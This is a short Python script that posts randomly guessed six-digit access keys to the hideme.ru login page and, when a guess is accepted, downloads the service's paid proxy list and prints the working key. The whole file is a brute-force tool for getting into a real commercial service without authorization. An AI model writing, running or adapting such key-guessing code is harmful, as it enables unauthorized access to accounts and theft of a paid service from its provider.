import random
import requests


def grab():
    print('[i]Grab hideme.ru:')
    for i in range(1, 4):
        key = random.randint(100000, 999999)
        try:
            result = check(key)
            # print(key)
            return result
            break
        except:
            pass


def check(key):
    data = {
        'c': key
    }
    headers = {
        'Content_Type': 'application/x-www-form-urlencoded'
    }
    response = requests.post("http://hideme.ru/login",
                             data=data, headers=headers, allow_redirects=False)

    if response.status_code == 302:
        proxies = requests.get("http://hideme.ru/api/proxylist.txt?out=plain&lang=ru")
        print('[+]Hideme.ru key: ' + str(key))
        return proxies.content.decode().strip()
    else:
        raise RuntimeError()